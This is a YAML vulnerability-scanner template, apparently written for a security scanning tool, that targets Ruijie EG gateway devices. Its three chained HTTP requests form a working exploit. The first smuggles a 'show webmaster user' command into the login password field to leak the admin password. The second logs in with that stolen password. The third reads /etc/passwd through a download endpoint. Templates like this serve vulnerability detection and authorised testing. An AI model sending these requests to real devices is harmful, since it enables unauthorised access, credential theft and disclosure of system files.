expression: r0() && r1() && r2()
id: ruijie-eg-file-read
info:
  author: abbin777
  name: ruijie-eg-file-read
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.content_type.contains("text/json")
    output:
      password: search["password"]
      search: '"{\"data\":\".*admin\\s?(?P<password>[^\\\\\"]*)".bsubmatch(response.body)'
    request:
      body: 'username=admin&password=admin?show+webmaster+user

        '
      headers:
        Content-Type: application/x-www-form-urlencoded
      method: POST
      path: /login.php
  r1:
    expression: response.status == 200 && response.content_type.contains("text/json")
      && response.headers["set-cookie"].contains("user=admin") && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
    request:
      body: 'username=admin&password={{password}}

        '
      headers:
        Content-Type: application/x-www-form-urlencoded
      method: POST
      path: /login.php
  r2:
    expression: response.status == 200 && response.body.bcontains(b"\"status\":true,")
      && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    request:
      body: 'file=/etc/passwd

        '
      method: POST
      path: /download.php?a=read_txt
